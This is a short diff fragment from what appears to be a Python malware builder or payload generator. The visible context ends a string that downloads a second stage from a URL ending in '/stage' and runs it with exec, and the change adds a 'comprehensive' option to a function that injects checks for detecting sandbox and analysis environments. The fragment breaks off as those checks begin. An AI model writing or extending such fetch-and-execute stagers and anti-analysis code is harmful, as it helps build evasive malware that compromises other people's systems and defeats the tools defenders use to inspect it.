@@ -78,7 +78,7 @@ except:d=urllib.request.urlopen(u+"/stage").read()
 exec(d)'''
 
 
-def add_sandbox_checks(code: str) -> str:
+def add_sandbox_checks(code: str, comprehensive: bool = False) -> str:
     """Add checks to detect sandbox/analysis environments."""
     checks = '''
 import os,time,platform,multiprocessing
